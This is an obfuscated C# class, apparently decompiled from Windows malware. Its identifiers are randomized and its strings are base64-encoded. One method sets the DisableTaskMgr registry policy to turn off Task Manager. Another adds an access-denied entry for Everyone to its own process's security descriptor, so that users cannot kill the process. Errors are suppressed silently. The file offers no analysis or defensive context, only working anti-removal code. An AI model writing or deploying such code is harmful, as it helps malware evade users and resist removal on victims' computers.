using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace vQzMGKHeycFziMq;

internal class XmlqONJtKCTDAA
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr TopnudvCLtjgFx, int GTpfZqiZEIn, [Out] byte[] wnMvtVNNIgv, uint oxsFhcOGJuSAjoX, out uint DYjAoQYtEzEp);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr dYWWFktRTWLf, int PjYxizIxgn, [In] byte[] YIMwQMSlrHWy);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void aPESQrjdcFWWRjJ(bool MZJVxsRnSpmpW)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(yzZnBHwSsJOOcf.jLGThbkXlozfB("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(yzZnBHwSsJOOcf.jLGThbkXlozfB("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor RzIwHEtOeHd(IntPtr TUWCKVqHDpB)
	{
		byte[] wnMvtVNNIgv = new byte[0];
		GetKernelObjectSecurity(TUWCKVqHDpB, 4, wnMvtVNNIgv, 0u, out var DYjAoQYtEzEp);
		if ((long)DYjAoQYtEzEp > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(TUWCKVqHDpB, 4, wnMvtVNNIgv = new byte[DYjAoQYtEzEp], DYjAoQYtEzEp, out DYjAoQYtEzEp))
		{
			return null;
		}
		return new RawSecurityDescriptor(wnMvtVNNIgv, 0);
	}

	private void tKiDBkcxFMH(IntPtr IfrrbZRNkzZfE, RawSecurityDescriptor cBCeqzJrknHuYp)
	{
		byte[] array = new byte[cBCeqzJrknHuYp.BinaryLength];
		cBCeqzJrknHuYp.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(IfrrbZRNkzZfE, 4, array);
	}

	public void rpzUMUQZvyHL()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = RzIwHEtOeHd(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			tKiDBkcxFMH(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
